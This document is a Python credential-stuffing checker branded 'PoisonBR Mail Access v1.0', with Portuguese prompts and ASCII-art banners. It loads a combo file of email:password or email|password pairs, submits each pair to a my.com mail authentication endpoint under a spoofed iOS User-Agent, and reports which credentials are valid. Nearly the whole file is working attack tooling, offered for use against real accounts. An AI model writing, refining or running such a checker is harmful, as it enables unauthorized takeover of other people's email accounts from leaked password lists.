import requests, time, os

R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'

os.system('git pull && clear')

print(f'''{C}
                            /+osyhhhhhhyys++/
                         +oydddhhhhyyhhhhdddhy+/
                      /+yddhyyyys.josue.syyhddhs/
                     +hddyyssssssssssssssssssyyhdds/
                   /sddhyyyyyyssssssssssssssyyyyyhmh+
                  /hmdhhddddddhhhyyyyyyhhhhdddddhhhddo
                 /hmmdhs+/ //+osyhhhhhhysso+////ohddmdo
                /hmmmy{B}.           `````          `{C}smddd+
                smddm/{B}     `````          `````   {C}mdhmh/
               +ddydm+{B}  -/osyyyys+.    ./syyyyso/-{C}mdydms
               ymhyhmh{B}.yyo/ -- +hdo  /dho -- /oyh.{C}ymdyymd/
              /dmyyymd{B}.  ``.-   ./   -/.-   .``  `{C}dmhsydmo
              smdysymd{B}   shdhyydy      sdyyhddy   {C}dmyyshmy
              dmysshmy{B}                            {C}smhssymd/
             /dmyssymd{B}                            {C}hmhsyymm/
             /dmyssyhms{B}                          /{C}mdysyymm/
             /dmyssyydm/{B}  sh       hh/     -hy  .{C}dmyssyymm/
              dmhssssydd/{B} -hdhysshdysdhssyhdd  -{C}hmhyssyymd/
              ymhssssyyddo{B}``. //+/.` ./+// -` /{C}ddhysssyhmh
              +mdysssssyhdh{B} `     `/+`      -{C}sddysssssydmo
               ymhysssssyyddh/{B}`   `dm.   ` {C}sddhysssssyhmh/
               /hmhysssssyyyhdds{B} ..dm . {C}ohddhyyssssyyhmd+
                /yddhyssssssyyhhddhddddddhyyssssssyydmh+
               /+sdmmdhhyyyysssyyyyyyyyyysssyyyyyhddmdyo+/
           /+shdddhhyhhddddddhhhhhhhhhhhhhhdddddddhyyhhdddyo/
         /shddhyyysssssyyyyhhhhhhhhhhhhhhhhhhyyyyyssssyyyhdddy+
        /hmhyyssssssssssssssssssssssssssssssssssssssssssssyyhddo
        /dmhyyyyyssssssssssssssssssssssssssssssssssssssyyyyyydms
         +yhddddddhhhhhyyyyyyyyyyyyyyyyyyyyyyyyyyhhhhhdddddddhs/
           //++oossyyhhhhhhhdddddddddddddddddhhhhhhyyssoo++///
                       ///////+++++++++++++//////
     ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██████╗ ██████╗
     ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██╔══██╗██╔══██╗
     ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██████╔╝██████╔╝
     ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██╔══██╗██╔══██╗
     ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██████╔╝██║  ██║
     ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
     {RT}{B}*t.me/p0isonBR*{RT}'''); time.sleep(3)

os.system('clear')

print(f'''{B}*By PoisonBR
{B}███╗   ███╗ █████╗ ██╗██╗     {C} █████╗  ██████╗ ██████╗███████╗███████╗███████╗
{B}████╗ ████║██╔══██╗██║██║     {C}██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
{B}██╔████╔██║███████║██║██║     {C}███████║██║     ██║     █████╗  ███████╗███████╗
{B}██║╚██╔╝██║██╔══██║██║██║     {C}██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
{B}██║ ╚═╝ ██║██║  ██║██║███████╗{C}██║  ██║╚██████╗╚██████╗███████╗███████║███████║
{B}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝{C}╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝ {G}v1.0{C}
''')

db=open(input('Indique o caminho do arquivo: '), 'r').read().splitlines()
print(G+str(len(db))+C+' e-mails no arquivo.'); time.sleep(3)
print('Testando credenciais, aguarde...')

def checker(email, senha, c):
    acesso=requests.get('https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login='+email+'&Password='+senha, headers={'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0'}).text
    if ('Ok=1') in acesso:
        print('Credenciais válidas: '+combo)
        print('E-mails verificados: '+c+', e-mails restantes: '+str(len(db)-c))
c=0        
for combo in db:
  if (':') in combo:
    email=combo.split(':')[0]
    senha=combo.split(':')[1]
    c=c+1
    checker(email, senha, c)
  elif ('|') in combo:
    email=combo.split('|')[0]
    senha=combo.split('|')[1]
    c=c+1
    checker(email, senha, c)
  else:
    print('Combo inválido: '+combo)
